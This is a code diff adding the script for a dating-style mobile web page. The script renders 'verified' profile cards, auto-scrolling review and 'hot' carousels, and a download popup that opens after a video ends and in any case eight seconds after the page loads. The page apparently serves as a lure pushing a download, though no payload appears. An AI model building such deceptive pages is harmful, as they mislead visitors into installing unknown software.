+    var ratios = ['3/4', '4/5', '1/1', '3/4', '4/5', '3/4'];
+    var colL = '', colR = '';
+    USERS.slice(0, 15).forEach(function(u, i) {
+      var card = '<div class="p-card" style="aspect-ratio:' + ratios[i % ratios.length] + ';" onclick="openViewer(\'' + u.name + '\',\'' + u.age + '\',\'' + u.job + '\',\'' + u.h + '\',\'' + u.w + '\',\'' + u.loc + '\',\'images/' + u.n + '-1.jpg\')">'
+        + '<img src="images/' + u.n + '-1.jpg" alt="">'
+        + '<div class="p-shade"></div>'
+        + '<span class="p-badge ' + u.bt + '">' + u.badge + '</span>'
+        + '<button class="p-play" onclick="event.stopPropagation();k2(event)" aria-label="Play video">'
+        + '<svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M8 5v14l11-7z"></path></svg>'
+        + '</button>'
+        + '<div class="p-info">'
+        + '<div class="p-name">' + u.name + ' <span class="v">✓</span> <span class="p-age">' + u.age + '</span></div>'
+        + '<div class="p-job">' + u.job + '</div>'
+        + '<div class="p-loc">📍 ' + u.loc + '</div>'
+        + '</div></div>';
+      if (i % 2 === 0) { colL += card; } else { colR += card; }
+    });
+    document.getElementById('userList').innerHTML = '<div class="p-col">' + colL + '</div><div class="p-col">' + colR + '</div>';
+
+    // Viewer
+    function openViewer(name, age, job, h, w, loc, src) {
+      document.getElementById('vImg').src = src;
+      var info = '<div class="v-name">' + name + ', ' + age + '</div>';
+      if (job) info += '<div class="v-job">' + job + '</div>';
+      if (h && w) info += '<div class="v-stats">' + h + ' · ' + w + '</div>';
+      if (loc) info += '<div class="v-loc">' + loc + '</div>';
+      document.getElementById('vInfo').innerHTML = info;
+      document.getElementById('viewer').classList.add('on');
+      document.body.style.overflow = 'hidden';
+    }
+    function closeViewer() {
+      document.getElementById('viewer').classList.remove('on');
+      document.body.style.overflow = '';
+    }
+
+    // Hot carousel auto-scroll
+    (function() {
+      var c = document.getElementById('hotScroll');
+      var dots = document.querySelectorAll('#hotDots .hot-dot');
+      if (!c || !dots.length) return;
+      var cards = c.querySelectorAll('.hot-card');
+      var i = 0, t = cards.length;
+      c.addEventListener('scroll', function() {
+        var w = cards[0] ? cards[0].offsetWidth + 10 : 148;
+        var idx = Math.round(c.scrollLeft / w);
+        if (idx >= t) idx = 0;
+        dots.forEach(function(d, di) { d.classList.toggle('on', di === idx); });
+        i = idx;
+      }, { passive: true });
+      setInterval(function() {
+        i = (i + 1) % t;
+        var w = cards[0] ? cards[0].offsetWidth + 10 : 148;
+        if (i === 0) { c.scrollTo({ left: 0, behavior: 'smooth' }); }
+        else { c.scrollTo({ left: i * w, behavior: 'smooth' }); }
+        dots.forEach(function(d, di) { d.classList.toggle('on', di === i); });
+      }, 2500);
+    })();
+
+    // Review carousel auto-scroll
+    (function() {
+      var c = document.getElementById('reviewScroll');
+      if (!c) return;
+      var cards = c.querySelectorAll('.review-card');
+      var i = 0, t = cards.length;
+      setInterval(function() {
+        i = (i + 1) % t;
+        var w = cards[0] ? cards[0].offsetWidth + 12 : 262;
+        if (i === 0) { c.scrollTo({ left: 0, behavior: 'smooth' }); }
+        else { c.scrollTo({ left: i * w, behavior: 'smooth' }); }
+      }, 2000);
+    })();
+
+    // Video finished -> show download popup
+    function closeDownload() {
+      document.getElementById('dlOverlay').classList.remove('on');
+      document.body.style.overflow = '';
+    }
+    function showDownload() {
+      document.getElementById('dlOverlay').classList.add('on');
+      document.body.style.overflow = 'hidden';
+    }
+    (function() {
+      var v = document.getElementById('myVideo');
+      if (!v) return;
+      v.addEventListener('ended', showDownload);
+    })();
+    // Also show the download popup 8 seconds after the page loads
+    setTimeout(showDownload, 8000);
+  </script>
+</body>
+</html>
